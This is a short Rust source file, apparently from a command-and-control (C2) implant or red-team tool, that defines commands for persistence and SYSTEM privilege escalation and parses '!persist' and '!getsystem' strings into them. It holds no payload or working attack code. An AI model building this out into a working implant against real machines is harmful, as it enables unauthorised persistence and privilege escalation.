#[derive(Debug)]
pub enum C2Command {
    Persist,
    GetSystem
}

pub fn parse_command(cmd_str :&str) -> Option<C2Command> {
    match cmd_str {
        "!persist" => Some(C2Command::Persist),
        "!getsystem" => Some(C2Command::GetSystem),
        _ => None
    }
}
